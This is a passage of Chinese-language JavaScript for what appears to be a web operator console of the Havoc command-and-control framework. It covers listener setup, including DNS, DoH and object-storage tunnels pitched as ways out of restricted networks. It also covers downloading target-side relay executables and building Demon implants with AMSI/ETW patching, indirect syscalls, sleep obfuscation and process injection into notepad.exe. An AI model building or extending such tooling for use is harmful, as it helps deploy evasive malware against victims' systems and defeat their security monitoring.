        <label>随机填充 <input class="input tiny" type="number" name="padding" min="0" max="255" value="${escapeHtml(val("padding", "8"))}"> 字节</label>
        <label class="check"><input type="checkbox" name="http_rewrite" ${val("http_rewrite", true) ? "checked" : ""}> HTTP 改写</label>
      </div>
      <label class="for-transport">心跳间隔</label><input class="input for-transport" type="number" name="ping_interval" min="1" value="${escapeHtml(val("ping_interval", "10"))}">
      <label class="for-transport">断线超时</label><input class="input for-transport" type="number" name="disconnect_timeout" min="5" value="${escapeHtml(val("disconnect_timeout", "30"))}">
      <label class="for-transport">备注</label><input class="input for-transport" name="remark" value="${escapeHtml(val("remark", ""))}">
      <div class="full modal-note for-transport">
        中继器在目标上监听 <code>127.0.0.1:1080</code>，把 Demon 的 HTTP 代理流量经本加密传输转发到上游
        （通常是 <code>127.0.0.1:8080</code> 的 Havoc HTTP 监听器）。保存后点「下载中继」生成 Windows/Linux 中继器，
        并在原生 HTTP 监听器里把「载荷代理」设为 <code>127.0.0.1:1080</code> 后生成载荷。
      </div>
    </div>`;
  const modal = openModal(editing ? `编辑监听器 · ${listener.name}` : "添加监听器", body, [
    { label: "取消", action: closeModal },
    { label: editing ? (serviceDef ? "关闭" : "保存") : "创建", primary: true, action: async (root) => {
      // teamserver 的 ListenerEdit 不处理服务端插件协议；只读展示，避免假保存。
      if (editing && serviceDef) { closeModal(); return; }
      const get = (name) => {
        const node = root.querySelector(`[name="${name}"]`);
        return node ? String(node.value).trim() : "";
      };
      const checked = (name) => {
        const node = root.querySelector(`[name="${name}"]`);
        return !!(node && node.checked);
      };
      const rawMode = editing ? mode : (root.querySelector('[name="mode"]').value || "http");
      const selectedMode = rawMode.startsWith("svc:") ? rawMode : rawMode.toLowerCase();
      const svcDef = serviceModeDef(selectedMode);
      const name = editing ? listener.name : get("name");
      if (!name) { toast("名称必填", "warn"); return; }
      const listValues = (kind) => Array.from(
        root.querySelectorAll(`.list-editor[data-list="${kind}"] .list-row input`)
      ).map((node) => String(node.value).trim()).filter(Boolean);
      const nativeMode = selectedMode === "http" || selectedMode === "https";
      let payload;
      if (svcDef) {
        const fields = {};
        root.querySelectorAll("[data-service-field]").forEach((node) => {
          fields[node.dataset.serviceField] = String(node.value);
        });
        for (const item of (svcDef.items || [])) {
          if ((item.object || "input") !== "input") continue;
          if (item.required && !String(fields[item.name] || "").trim()) {
            toast(`字段「${item.text || item.name}」必填`, "warn"); return;
          }
        }
        payload = Object.assign({ name, protocol: svcDef.name }, fields);
      } else if (selectedMode === "smb") {
        payload = { name, protocol: "Smb", pipe_name: get("pipe_name") };
        if (!payload.pipe_name) { toast("SMB 管道名称必填", "warn"); return; }
        if (payload.pipe_name.includes("\\")) { toast("管道名称不要包含反斜杠或 \\\\.\\pipe\\ 前缀", "warn"); return; }
      } else if (selectedMode === "external") {
        payload = { name, protocol: "External", endpoint: get("endpoint").replace(/^\/+/, "") };
        if (!payload.endpoint) { toast("External 端点必填", "warn"); return; }
        if (payload.endpoint.includes("/")) { toast("External 端点必须是单个路径段（不含 /）", "warn"); return; }
      } else if (nativeMode) {
        payload = {
          name, protocol: selectedMode === "https" ? "Https" : "Http",
          host_bind: get("host_bind"), port_bind: get("port_bind"), port_conn: get("port_conn"),
          hosts: listValues("hosts"), host_rotation: get("host_rotation"),
          headers: listValues("headers"), uris: listValues("uris"),
          user_agent: get("user_agent"), host_header: get("host_header"),
          secure: selectedMode === "https" ? "true" : "false",
          proxy_enabled: get("proxy_enabled"), proxy_type: get("proxy_type"),
          proxy_host: get("proxy_host"), proxy_port: get("proxy_port"),
          proxy_username: get("proxy_username"), proxy_password: get("proxy_password"),
        };
      } else {
        const num = (key, fallback) => Number(get(key) || fallback);
        payload = {
          name, mode: selectedMode,
          listen_host: get("listen_host") || "0.0.0.0",
          listen_port: num("listen_port", 0),
          connect_host: get("connect_host"), connect_port: num("connect_port", num("listen_port", 0)),
          upstream_host: get("upstream_host") || "127.0.0.1", upstream_port: num("upstream_port", 8080),
          ws_path: get("ws_path") || "/ws",
          dns_domain: get("dns_domain"), public_dns: get("public_dns"),
          oss_url: get("oss_url"), oss_prefix: get("oss_prefix") || "havoc",
          vkey: get("vkey"), salt: get("salt"),
          compress: checked("compress"), padding: num("padding", 0),
          http_rewrite: checked("http_rewrite"),
          ping_interval: num("ping_interval", 10), disconnect_timeout: num("disconnect_timeout", 30),
          remark: get("remark"), autostart: true,
        };
        if (!payload.listen_port) { toast("监听端口必填", "warn"); return; }
        if (payload.vkey.length < 8 || payload.salt.length < 8) { toast("Vkey / Salt 至少 8 个字符", "warn"); return; }
        if (["dns", "doh", "dot"].includes(payload.mode) && !payload.dns_domain) { toast("该模式必须填写隧道域名", "warn"); return; }
      }
      try {
        if (editing) await api(`/api/listeners/${encodeURIComponent(listener.name)}`, { method: "PUT", body: payload });
        else await api("/api/listeners", { method: "POST", body: payload });
        toast(editing ? "已保存监听器" : "已创建监听器", "good");
        closeModal();
      } catch (err) { toast(err.message, "error"); }
    } },
  ], { className: "listener-modal" });

  bindListEditors(modal);
  const modeSelect = modal.querySelector('[name="mode"]');
  modeSelect.value = mode === "https" ? "https" : (mode === "http" ? "http" : mode);
  if (editing) {
    const native = mode === "http" || mode === "https";
    const proxyEnabled = String(listener.proxy_enabled || listener["Proxy Enabled"] || "").toLowerCase();
    if (native && proxyEnabled) modal.querySelector('[name="proxy_enabled"]').value = "true";
    if (native) {
      const rot = listener.host_rotation || "round-robin";
      modal.querySelector('[name="host_rotation"]').value = rot;
      // teamserver 的 ListenerEdit 只应用 UA/Headers/URIs/Proxy；绑定地址与端口只读
      ["host_bind", "port_bind", "port_conn"].forEach((name) => {
        const node = modal.querySelector(`[name="${name}"]`);
        if (node) node.disabled = true;
      });
      const note = modal.querySelector(".native-edit-note");
      if (note) note.classList.remove("hidden");
    }
    if (serviceDef) {
      const note = modal.querySelector(".service-edit-note");
      if (note) note.classList.remove("hidden");
    }
  }

  const nativeModes = new Set(["http", "https"]);
  const applyMode = () => {
    const rawMode = editing ? mode : (modeSelect.value || "http");
    const svcDef = serviceModeDef(rawMode);
    const m = svcDef ? rawMode : rawMode.toLowerCase();
    const serviceMode = !!svcDef;
    const native = !serviceMode && nativeModes.has(m);
    const smb = !serviceMode && m === "smb";
    const external = !serviceMode && m === "external";
    modal.querySelectorAll(".for-native").forEach((node) => { node.style.display = native ? "" : "none"; });
    modal.querySelectorAll(".for-smb").forEach((node) => { node.style.display = smb ? "" : "none"; });
    modal.querySelectorAll(".for-external").forEach((node) => { node.style.display = external ? "" : "none"; });
    modal.querySelectorAll(".for-service").forEach((node) => { node.style.display = serviceMode ? "" : "none"; });
    modal.querySelectorAll(".for-transport").forEach((node) => {
      node.style.display = (native || smb || external || serviceMode) ? "none" : "";
    });
    const fieldsBox = modal.querySelector("[data-service-fields]");
    if (fieldsBox) {
      const key = svcDef ? svcDef.name : "";
      if (fieldsBox.dataset.protocol !== key) {
        fieldsBox.dataset.protocol = key;
        fieldsBox.innerHTML = svcDef
          ? serviceFieldsHtml(svcDef, editing, editing ? (listener.service_fields || {}) : null)
          : "";
      }
    }
    modal.querySelectorAll(".for-ws").forEach((node) => { node.style.display = m === "ws" ? "" : "none"; });
    modal.querySelectorAll(".for-dns").forEach((node) => { node.style.display = ["dns", "doh", "dot"].includes(m) ? "" : "none"; });
    modal.querySelectorAll(".for-oss").forEach((node) => { node.style.display = m === "oss" ? "" : "none"; });
    if (!editing) {
      const pb = modal.querySelector('[name="port_bind"]');
      const pc = modal.querySelector('[name="port_conn"]');
      const def = m === "https" ? "443" : (m === "http" ? "80" : null);
      const swap = (m === "https" && pb && pb.value === "80") ||
                   (m === "http" && pb && pb.value === "443");
      if (def && pb && pc && (!pb.value || pb.value === "8080" || swap)) {
        pb.value = def;
        pc.value = def;
      }
    }
    const desc = modal.querySelector(".mode-desc");
    const texts = {
      http: "Havoc 原生 HTTP 监听器，由 teamserver 承载，默认开启 Demon AES 加密。",
      https: "Havoc 原生 HTTPS 监听器（自签证书）。",
      smb: "SMB 命名管道监听器：不绑定端口，PipeName 写入载荷，供父级 Demon 创建管道进行枢轴。",
      external: "External C2 端点：注册到 teamserver 40056 的 POST 端点，供第三方 C2/自定义 Agent 使用；不支持 Demon 载荷。",
      tcp: "TCP 传输：记录级 AES-256-GCM 加密，适合被严格限制但仍允许出站 TCP 的网络。",
      kcp: "KCP 风格可靠 UDP：序号 / ACK / 重传 / 窗口，抗丢包优于裸 UDP。",
      udp: "UDP 传输：同一可靠层，适合只能出 UDP 的环境。",
      ws: "WebSocket 传输：加密记录封装在 WS 二进制消息中，可穿过常见反向代理。",
      dns: "DNS 隧道：QNAME 上行、TXT 下行，可借助递归解析器出网。",
      doh: "DoH 传输：DNS 消息封装在 HTTPS POST（application/dns-message）。",
      dot: "DoT 传输：TLS 上的 DNS 消息（自签证书）。",
      oss: "OSS 对象存储隧道：PUT 上行 / GET 下行，适合仅允许对象存储 API 的出网策略。",
    };
    if (svcDef) {
      const count = (svcDef.items || []).filter((it) => (it.object || "input") === "input").length;
      desc.textContent = `服务端插件${svcDef.agent ? `（${svcDef.agent}）` : ""}注册的自定义监听器协议「${svcDef.name}」，`
        + `${count} 个字段；提交后由插件负责启动监听。`;
    } else {
      desc.textContent = texts[m] || "";
    }
  };
  applyMode();
  modeSelect.addEventListener("change", applyMode);
  const fillRandom = (name, bytes) => {
    const node = modal.querySelector(`[name="${name}"]`);
    if (!node) return;
    const arr = new Uint8Array(bytes);
    crypto.getRandomValues(arr);
    node.value = Array.from(arr).map((x) => x.toString(16).padStart(2, "0")).join("");
  };
  const gv = modal.querySelector(".gen-vkey");
  const gs = modal.querySelector(".gen-salt");
  if (gv) gv.addEventListener("click", () => fillRandom("vkey", 12));
  if (gs) gs.addEventListener("click", () => fillRandom("salt", 8));
}

function openRelayDialog(listener) {
  if (!listener || listener.kind !== "transport") {
    toast("只有加密传输监听器需要中继器；原生监听器由 Demon 直接回连", "warn");
    return;
  }
  const body = `
    <div class="form-grid">
      <label>目标系统</label>
      <select class="input" name="os"><option value="windows">Windows</option><option value="linux">Linux</option></select>
      <label>架构</label>
      <select class="input" name="arch"><option value="amd64">amd64 (x64)</option><option value="386">386 (x86)</option><option value="arm64">arm64</option></select>
      <label>本地监听</label><input class="input" name="listen" value="127.0.0.1:1080">
      <div class="full modal-note">
        中继器会内嵌本监听器的 <b>模式 / 地址 / Vkey / Salt / 加密参数</b>，在目标上运行后监听上面的本地地址。
        把 Havoc 原生 HTTP 监听器的「载荷代理」设为该地址（默认 <code>127.0.0.1:1080</code>），
        再生成 Demon 载荷；C2 流量就会走 <b>${escapeHtml(String(listener.mode || "").toUpperCase())}</b> 加密传输。
        首次编译约 10–20 秒，之后命中缓存。
      </div>
      <div class="full modal-note muted">也可在目标上手动指定：<code>relay.exe --listen 127.0.0.1:1080 --server ${escapeHtml(listener.connect || "")}</code></div>
    </div>`;
  openModal(`下载中继器 · ${listener.name}`, body, [
    { label: "取消", action: closeModal },
    { label: "下载", primary: true, action: async (root) => {
      const os = root.querySelector('[name="os"]').value;
      const arch = root.querySelector('[name="arch"]').value;
      const listen = root.querySelector('[name="listen"]').value.trim() || "127.0.0.1:1080";
      toast("正在编译中继器（首次约 10–20 秒）…", "info", 6000);
      try {
        const url = `/api/listeners/${encodeURIComponent(listener.name)}/relay?os=${encodeURIComponent(os)}&arch=${encodeURIComponent(arch)}&listen=${encodeURIComponent(listen)}`;
        const resp = await fetch(url, { credentials: "same-origin" });
        if (!resp.ok) {
          let message = `HTTP ${resp.status}`;
          try { const j = await resp.json(); message = j.message || j.error || message; } catch (e) {}
          throw new Error(message);
        }
        const blob = await resp.blob();
        const ext = os === "windows" ? ".exe" : "";
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = `htp-relay-${listener.name}-${os}-${arch}${ext}`;
        document.body.appendChild(a); a.click(); a.remove();
        setTimeout(() => URL.revokeObjectURL(a.href), 30000);
        toast("中继器已生成", "good");
        closeModal();
      } catch (err) { toast(err.message, "error"); }
    } },
  ], { className: "relay-modal" });
}

async function refreshStager() {
  const tabs = Array.from(S.tabs.values()).filter((t) => t.kind === "listeners");
  if (!tabs.length) return;
  let data;
  try {
    data = await api("/api/stager/health");
  } catch (err) {
    tabs.forEach((t) => setStagerStatus(t.el, false, `暂存服务不可用：${err.message}`));
    return;
  }
  if (!data.ok) { tabs.forEach((t) => setStagerStatus(t.el, false, data.error || "暂存服务离线")); return; }
  const h = data.health || {};
  const linux = h.linux_payloads || {};
  const linuxText = Object.keys(linux).length
    ? ` · Linux ${Object.keys(linux).join("/")}`
    : " · Linux 载荷缺失";
  const text = `在线 · ${h.payload || "payload"}（${fmtSize(h.payload_size)}）· 已命中 ${h.hits || 0} 次${linuxText}`;
  tabs.forEach((t) => setStagerStatus(t.el, true, text));
}

function setStagerStatus(el, online, text) {
  const box = el.querySelector(".qd-status");
  if (!box) return;
  box.classList.toggle("online", !!online);
  box.classList.toggle("offline", !online);
  box.querySelector(".qd-text").textContent = text;
}

function fmtSize(n) {
  n = Number(n || 0);
  if (n > 1024 * 1024) return `${(n / 1024 / 1024).toFixed(1)} MB`;
  if (n > 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${n} B`;
}

/* ================================================================
   载荷生成
   ================================================================ */

/* ================================================================
   载荷生成
   ================================================================ */
function payloadDefaults() {
  let demon = {};
  try { demon = S.profile && S.profile.Demon ? JSON.parse(S.profile.Demon) : {}; } catch (e) { demon = {}; }
  const injection = (demon.ProcessInjection || {});
  return {
    sleep: demon.Sleep != null ? demon.Sleep : 2,
    jitter: demon.Jitter != null ? demon.Jitter : 15,
    indirect: !!demon.IndirectSyscall,
    stack: !!demon.StackDuplication,
    sleepTech: demon.SleepTechnique || "WaitForSingleObjectEx",
    proxy: demon.ProxyLoading || "None (LdrLoadDll)",
    amsi: demon.AmsiEtwPatching || "None",
    spawn64: injection.Spawn64 || "C:\\Windows\\System32\\notepad.exe",
    spawn32: injection.Spawn32 || "C:\\Windows\\SysWOW64\\notepad.exe",
  };
}

function selectHtml(name, options, current) {
  return `<select class="input" name="${name}">` +
    options.map((o) => `<option value="${escapeHtml(o)}"${o === current ? " selected" : ""}>${escapeHtml(o)}</option>`).join("") +
    `</select>`;
}

function openPayloadDialog() {
  const d = payloadDefaults();
  const online = Array.from(S.listeners.values()).filter((l) =>
    l.kind !== "transport" &&
    String(l.protocol || "").toLowerCase() !== "external" &&
    String(l.status).toLowerCase() === "online");
  if (!online.length) { toast("没有在线监听器，请先在监听器标签创建/启动", "warn"); return; }
  const cfgRow = (label, control, opts = {}) => `
    <div class="cfg-row${opts.child ? " child" : ""}${opts.extraClass ? " " + opts.extraClass : ""}">
      <span class="cfg-name">${escapeHtml(label)}</span>
      <span class="cfg-val">${control}</span>
    </div>`;
  const body = `
    <div class="payload-dialog">
      <div class="payload-agent">
        <label>Agent：</label>
        <select class="input" name="agent"><option>Demon</option></select>
      </div>
      <fieldset class="payload-options">
        <legend>选项</legend>
        <div class="payload-opt"><label>监听器：</label>${selectHtml("listener", online.map((l) => l.name), online[0].name)}</div>
        <div class="payload-opt"><label>架构</label>${selectHtml("arch", ["x64", "x86"], "x64")}</div>
        <div class="payload-opt"><label>格式</label>${selectHtml("format", ["Windows Exe", "Windows Dll", "Windows Shellcode", "Windows Service Exe", "Linux Exe"], "Windows Exe")}</div>
        <div class="payload-tree">
          <div class="cfg-head"><span>配置项</span><span>值</span></div>
          <div class="cfg-body">
            ${cfgRow("休眠时间", `<input class="input" type="number" min="0" name="sleep" value="${d.sleep}">`)}
            ${cfgRow("抖动比例", `<input class="input" type="number" min="0" max="100" name="jitter" value="${d.jitter}">`)}
            ${cfgRow("服务名称", `<input class="input" name="service_name" value="DemonSvc">`, { extraClass: "svc-row hidden" })}
            ${cfgRow("间接系统调用", `<input type="checkbox" name="indirect"${d.indirect ? " checked" : ""}>`, { extraClass: "win-only" })}
            ${cfgRow("栈复制", `<input type="checkbox" name="stack"${d.stack ? " checked" : ""}>`, { extraClass: "win-only" })}
            ${cfgRow("休眠技术", selectHtml("sleep_technique", ["WaitForSingleObjectEx", "Foliage", "Ekko", "Zilean"], d.sleepTech), { extraClass: "win-only" })}
            ${cfgRow("休眠跳转指令", selectHtml("sleep_jmp", ["None", "jmp rax", "jmp rbx"], "None"), { extraClass: "win-only" })}
            ${cfgRow("代理加载", selectHtml("proxy", ["None (LdrLoadDll)", "RtlRegisterWait", "RtlCreateTimer", "RtlQueueWorkItem"], d.proxy), { extraClass: "win-only" })}
            ${cfgRow("Amsi/Etw 补丁", selectHtml("amsi", ["None", "Hardware breakpoints"], d.amsi), { extraClass: "win-only" })}
            <div class="cfg-row cfg-parent win-only" data-parent="injection">
              <span class="cfg-name"><i class="cfg-arrow">▾</i>进程注入</span><span class="cfg-val"></span>
            </div>
            <div class="cfg-children win-only" data-children="injection">
              ${cfgRow("64 位注入进程", `<input class="input" name="spawn64" value="${escapeHtml(d.spawn64)}">`, { child: true })}
              ${cfgRow("32 位注入进程", `<input class="input" name="spawn32" value="${escapeHtml(d.spawn32)}">`, { child: true })}
            </div>
            <input type="hidden" name="alloc" value="Native/Syscall">
            <input type="hidden" name="execute" value="Native/Syscall">
          </div>
        </div>
      </fieldset>
      <fieldset class="payload-console-box">
        <legend>构建控制台</legend>
        <pre class="build-console"></pre>
      </fieldset>
      <div class="download-row"></div>
    </div>`;
  const modal = openModal("载荷生成", body, [
    { label: "生成", primary: true, action: (root) => startPayloadBuild(root) },
  ], { className: "payload-modal", footAlign: "center" });
  S.payloadModal = true;
  S.payloadLogs = [];
  S.activeBuildId = null;
  const formatSel = modal.querySelector('[name="format"]');
  const svcRow = modal.querySelector(".svc-row");
  const syncService = () => {
    const isLinux = formatSel.value === "Linux Exe";
    svcRow.classList.toggle("hidden", formatSel.value !== "Windows Service Exe");
    modal.querySelectorAll(".win-only").forEach((el) => {
      el.classList.toggle("hidden", isLinux);
    });
  };
  formatSel.addEventListener("change", syncService);
  syncService();
  const parent = modal.querySelector('[data-parent="injection"]');
  const children = modal.querySelector('[data-children="injection"]');
  parent.addEventListener("click", () => {
    children.classList.toggle("hidden");
    parent.querySelector(".cfg-arrow").textContent = children.classList.contains("hidden") ? "▸" : "▾";
  });
}

function setPayloadButton(text, disabled) {
  const btn = Array.from(document.querySelectorAll(".modal-foot .btn")).find((b) => b.textContent === "生成" || b.textContent === "构建中…");
  if (!btn) return;
  btn.textContent = text;
  btn.disabled = !!disabled;
}

async function startPayloadBuild(root) {
  const get = (n) => root.querySelector(`[name="${n}"]`);
  const payload = {
    listener: get("listener").value,
    arch: get("arch").value,
    format: get("format").value,
    config: {
      sleep: get("sleep").value,
      jitter: get("jitter").value,
      indirect: get("indirect").checked,
      stack: get("stack").checked,
      sleep_technique: get("sleep_technique").value,
      sleep_jmp: get("sleep_jmp").value,
      proxy: get("proxy").value,
      amsi: get("amsi").value,
      alloc: get("alloc").value,
      execute: get("execute").value,
      spawn64: get("spawn64").value,
      spawn32: get("spawn32").value,
      service_name: get("service_name").value,
    },
  };
  const consoleEl = root.querySelector(".build-console");
  consoleEl.innerHTML = "";
  root.querySelector(".download-row").innerHTML = "";
  S.payloadLogs = [];
  setPayloadButton("构建中…", true);
  try {
    const data = await api("/api/payloads/build", { method: "POST", body: payload });
    S.activeBuildId = data.build.id;
    S.lastBuildId = data.build.id;
    appendPayloadLog({ type: "Info", text: `已提交构建：${payload.format} ${payload.arch} / ${payload.listener}（构建可能需要 1-2 分钟）` });
  } catch (err) {
    appendPayloadLog({ type: "Error", text: err.message });
    setPayloadButton("生成", false);
  }
}

function appendPayloadLog(log) {
  S.payloadLogs.push(log);
  if (S.payloadLogs.length > 500) S.payloadLogs.shift();
  renderPayloadLog(log);
}

function renderPayloadLog(log) {
  const el = document.querySelector(".build-console");
  if (!el) return;
  const type = String(log.type || "").toLowerCase();
  const cls = type.includes("error") ? "error" : type.includes("warn") ? "warn" : type.includes("good") ? "good" : "info";
  const line = document.createElement("div");
  line.className = cls;
  line.textContent = `[${log.time || fmtTime(now())}] ${log.type || "Info"}  ${log.text || ""}`;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}

function handlePayloadMessage(msg) {
  const build = msg.build;
  if (!build) return;
  if (build.status === "done") S.lastBuildId = build.id;
  if (!S.payloadModal || build.id !== S.activeBuildId) {
    if (msg.action === "done") toast(`载荷生成完成：${build.filename}`, "good");
    if (msg.action === "error") toast(`载荷生成失败：${build.error}`, "error");
    return;
  }
  if (msg.action === "log" && msg.log) renderPayloadLog(msg.log);
  if (msg.action === "done") { showPayloadDone(build); setPayloadButton("生成", false); }
  if (msg.action === "error") {
    renderPayloadLog({ type: "Error", text: build.error || "构建失败" });
    setPayloadButton("生成", false);
  }
}

function showPayloadDone(build) {
  const row = document.querySelector(".download-row");
  if (!row) return;
  row.innerHTML = `<span class="good" style="color:var(--green)">✔ 构建完成</span>
    <a href="/api/payloads/${build.id}/download">下载 ${escapeHtml(build.filename)}</a>
    <span class="dim">${fmtSize(build.size)}</span>`;
  appendPayloadLog({ type: "Good", text: `载荷已生成：${build.filename}（${build.size} 字节）` });
}

/* ================================================================
   扩展商店
   ================================================================ */
async function renderStorePane(el) {
  el.innerHTML = `
    <div class="store-wrap">
      <div class="store-body">
        <div class="store-list-wrap">
          <table class="data-table store-table">
            <thead><tr><th>名称</th><th>作者</th></tr></thead>
            <tbody></tbody>
          </table>
        </div>
        <div class="h-split store-splitter" title="拖动调整宽度"></div>
        <div class="store-detail-wrap">
          <div class="store-detail"></div>
          <button class="btn primary store-install" disabled>安装</button>
        </div>
      </div>
      <div class="store-log-wrap">
        <div class="store-log-head">
          <button class="link-btn store-refresh">刷新</button>
          <span class="spacer"></span>
          <span class="dim store-source"></span>
        </div>
        <pre class="store-log"></pre>
      </div>
    </div>`;
  el.querySelector(".store-refresh").addEventListener("click", () => loadStore(el, true));
  const split = el.querySelector(".store-splitter");
  const list = el.querySelector(".store-list-wrap");
  let drag = false;
  split.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    drag = true;
    const wrap = el.querySelector(".store-body").getBoundingClientRect();
    const move = (e) => {
      if (!drag) return;
      const w = Math.max(200, Math.min(wrap.width * 0.6, e.clientX - wrap.left));
      list.style.flex = `0 0 ${w}px`;
      list.style.width = `${w}px`;
    };
    const up = () => {
      drag = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
  if (S.store && S.store.modules && S.store.modules.length) renderStoreData(el, S.store);
  else await loadStore(el, false);
}

function renderStoreData(el, data) {
  const mods = data.modules || [];
  el.querySelector(".store-source").textContent = data.source === "upstream" ? "来源：havoc-store（GitHub）" : "来源：本地 Modules";
  el.querySelector(".store-table tbody").innerHTML = mods.map((m, i) => `
    <tr data-index="${i}" class="${S.storeSelected === i ? "selected" : ""}">
      <td class="name">${m.installed ? '<span class="store-dot" title="已安装"></span>' : ""}${escapeHtml(m.title)}</td>
      <td class="muted">${escapeHtml(m.author)}</td>
    </tr>`).join("") || `<tr><td colspan="2" class="muted">目录为空</td></tr>`;
  el.querySelectorAll(".store-table tbody tr").forEach((tr) => {
    const index = Number(tr.getAttribute("data-index"));
    if (Number.isNaN(index)) return;
    tr.addEventListener("click", () => {
      S.storeSelected = index;
      el.querySelectorAll(".store-table tbody tr").forEach((r) => r.classList.toggle("selected", r === tr));
      renderStoreDetail(el, index);
    });
  });
  const selected = (S.storeSelected != null && mods[S.storeSelected]) ? S.storeSelected : (mods.length ? 0 : null);
  S.storeSelected = selected;
  const installBtn = el.querySelector(".store-install");
  if (selected != null) renderStoreDetail(el, selected);
  else {
    el.querySelector(".store-detail").innerHTML = `<div class="empty">商店里没有可用模块</div>`;
    installBtn.disabled = true;
    installBtn.textContent = "安装";
  }
}

async function loadStore(el, refresh) {
  const tbody = el.querySelector(".store-table tbody");
  if (tbody) tbody.innerHTML = `<tr><td colspan="3" class="muted">加载商店目录…</td></tr>`;
  try {
    const data = await api("/api/store" + (refresh ? "?refresh=1" : ""));
    S.store = data;
    renderStoreData(el, data);
  } catch (err) {
    storeLog(el, `加载失败：${err.message}`, "error");
    if (tbody) tbody.innerHTML = `<tr><td colspan="3" class="muted">加载失败：${escapeHtml(err.message)}</td></tr>`;
    setTimeout(() => { if (el.isConnected) loadStore(el, true); }, 5000);
  }
}

function renderStoreDetail(el, index) {
  const m = (S.store && S.store.modules || [])[index];
  if (!m) return;
  const cats = Object.entries(m.category || {}).filter(([, v]) => v).map(([k]) => k).join(" · ");
  const guiNote = (m.category || {}).Graphical
    ? `<p class="modal-note">这是图形化扩展（havocui），Web 端只能安装/查看源码，运行需要在 Qt 客户端加载。</p>` : "";
  el.querySelector(".store-detail").innerHTML = `
    <h3>${escapeHtml(m.title)}</h3>
    <div class="store-author">${escapeHtml(m.author)}${cats ? " · " + escapeHtml(cats) : ""}</div>
    <p class="store-desc">${escapeHtml(m.description)}</p>
    ${guiNote}
    <div class="store-link">${m.link ? `<a href="${escapeHtml(m.link)}" target="_blank" rel="noopener">${escapeHtml(m.link)}</a>` : "本地模块"}</div>
    <div class="dim">入口：${escapeHtml(m.entrypoint || "—")}</div>`;
  const btn = el.querySelector(".store-install");
  btn.disabled = !!m.installed;
  btn.textContent = m.installed ? "已安装" : "安装";
  btn.onclick = () => installStoreModule(el, index);
}

async function installStoreModule(el, index) {
  const btn = el.querySelector(".store-install");
  if (btn) { btn.disabled = true; btn.textContent = "安装中…"; }
  storeLog(el, `开始安装：${(S.store.modules[index] || {}).title || index}`);
  try {
    const data = await api("/api/store/install", { method: "POST", body: { index } });
    (data.log || []).forEach((line) => storeLog(el, line, "good"));
    storeLog(el, `安装完成：${data.path}`, "good");
    toast("扩展已安装", "good");
    await loadStore(el, false);
    refreshScriptsList();
  } catch (err) {
    storeLog(el, `安装失败：${err.message}`, "error");
    toast(err.message, "error");
    if (btn) { btn.disabled = false; btn.textContent = "安装"; }
  }
}

function storeLog(el, text, kind = "") {
  const box = el.querySelector(".store-log");
  if (!box) return;
  const line = document.createElement("div");
  if (kind) line.className = kind;
  line.textContent = `[${fmtTime(now())}] ${text}`;
  box.appendChild(line);
  box.scrollTop = box.scrollHeight;
}

function refreshScriptsList() {
  const tab = S.tabs.get("scripts");
  if (tab) renderScriptsPane(tab.el);
}

/* ================================================================
   脚本管理
   ================================================================ */
async function renderScriptsPane(el) {
  el.innerHTML = `
    <div class="scripts-wrap">
      <div class="scripts-body">
        <div class="data-table-wrap scripts-list-wrap">
          <table class="data-table scripts-table">
            <thead><tr><th>路径</th></tr></thead>
            <tbody></tbody>
          </table>
        </div>
        <div class="h-split scripts-splitter" title="拖动调整宽度"></div>
        <div class="scripts-editor">
          <div class="script-head"><span class="script-path dim">选择一个脚本</span><span class="spacer"></span>
            <button class="link-btn scripts-refresh">刷新</button>
            <button class="btn small script-copy">复制路径</button></div>
          <pre class="script-source"></pre>
          <div class="script-commands"></div>
          <pre class="script-log"></pre>
        </div>
      </div>
      <div class="scripts-actions">
        <button class="btn small scripts-upload">上传脚本</button>
        <button class="btn small scripts-reload">重新加载</button>
        <button class="btn small scripts-unload">卸载</button>
        <button class="btn small primary scripts-load">加载脚本</button>
        <input type="file" class="scripts-file hidden" accept=".py">
      </div>
    </div>`;
  el.querySelector(".scripts-load").addEventListener("click", () => loadSelectedScript(el));
  el.querySelector(".scripts-reload").addEventListener("click", () => reloadSelectedScript(el));
  el.querySelector(".scripts-unload").addEventListener("click", () => unloadSelectedScript(el));
  const fileInput = el.querySelector(".scripts-file");
  el.querySelector(".scripts-upload").addEventListener("click", () => fileInput.click());
  fileInput.addEventListener("change", () => uploadScript(el, fileInput));
  el.querySelector(".scripts-refresh").addEventListener("click", () => renderScriptsPane(el));
  setTimeout(() => { if (el.isConnected) (S.scriptLog || []).forEach((line) => appendScriptLog(el, line, "good")); }, 0);
  el.querySelector(".script-copy").addEventListener("click", () => {
    if (S.scriptSelected) copyText(S.scriptSelected);
  });
  const split = el.querySelector(".scripts-splitter");
  const listWrap = el.querySelector(".scripts-list-wrap");
  let drag = false;
  split.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    drag = true;
    const wrap = el.querySelector(".scripts-body").getBoundingClientRect();
    const move = (e) => {
      if (!drag) return;
      const w = Math.max(200, Math.min(wrap.width * 0.7, e.clientX - wrap.left));
      listWrap.style.flex = `0 0 ${w}px`;
      listWrap.style.width = `${w}px`;
    };
    const up = () => {
      drag = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
  let data;
  try {
    data = await api("/api/scripts");
  } catch (err) {
    el.querySelector(".scripts-table tbody").innerHTML = `<tr><td class="muted">加载失败：${escapeHtml(err.message)}</td></tr>`;
    return;
  }
  S.scripts = data.scripts || [];
  S.pythonCommands = data.commands || [];
  const tbody = el.querySelector(".scripts-table tbody");
  if (!S.scripts.length) {
    tbody.innerHTML = `<tr><td class="muted">暂无脚本（可在扩展商店安装，或把 .py 放到 data/extensions/）</td></tr>`;
  } else {
    tbody.innerHTML = S.scripts.map((s) => `
      <tr data-path="${escapeHtml(s.path)}" class="${s.path === S.scriptSelected ? "selected" : ""}">
        <td class="name">${s.loaded ? '<span class="store-dot" title="已加载"></span>' : ""}${s.autoload ? '<span class="store-dot autoload" title="自动加载（网关重启后恢复）"></span>' : ""}${escapeHtml(s.path)}</td>
      </tr>`).join("");
    tbody.querySelectorAll("tr[data-path]").forEach((row) => {
      const select = () => {
        S.scriptSelected = row.getAttribute("data-path");
        tbody.querySelectorAll("tr").forEach((x) => x.classList.toggle("selected", x === row));
